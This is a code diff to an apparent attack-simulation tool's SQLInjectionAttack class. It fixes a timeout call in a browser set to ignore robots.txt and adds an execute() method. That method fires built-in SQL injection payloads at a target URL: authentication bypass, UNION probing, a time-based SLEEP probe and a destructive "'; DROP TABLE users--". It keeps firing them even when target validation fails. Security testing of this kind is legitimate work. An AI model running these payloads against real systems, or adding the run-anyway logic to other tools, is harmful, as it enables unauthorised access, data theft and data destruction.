@@ -150,8 +150,9 @@ class SQLInjectionAttack:
         browser.set_handle_referer(True)
         browser.set_handle_robots(False)  # Ignore robots.txt
 
-        # Set timeout
-        browser.set_timeout(self.timeout)
+        # Set timeout (mechanize uses set_socket_timeout, not set_timeout)
+        if hasattr(browser, "set_socket_timeout"):
+            browser.set_socket_timeout(self.timeout)
 
         # Set user agent if provided
         if self.user_agent:
@@ -320,6 +321,31 @@ class SQLInjectionAttack:
         # Log response length for potential blind SQL injection analysis
         if self.verbose:
             logger.info(f"Response length: {len(response_content)} bytes")
+
+
+    def execute(self) -> dict:
+        """Run the SQL injection attack using built-in payloads."""
+        default_payloads = [
+            "' OR '1'='1",
+            "' OR 1=1--",
+            "' UNION SELECT NULL--",
+            "'; DROP TABLE users--",
+            "1' AND SLEEP(2)--",
+        ]
+        if not self.validate_target():
+            logger.warning("Target validation failed (target may not have SQL endpoint) — running probes anyway")
+        tested = 0
+        for payload in default_payloads:
+            self.execute_attack(payload)
+            tested += 1
+        logger.info(f"SQL injection probe completed: {tested} payloads tested against {self.target_url}")
+        return {
+            "target_url": self.target_url,
+            "control_name": self.control_name,
+            "payloads_tested": tested,
+            "successful_attacks": self.successful_attacks,
+            "failed_attacks": self.failed_attacks,
+        }
 
 
 def execute_attack(
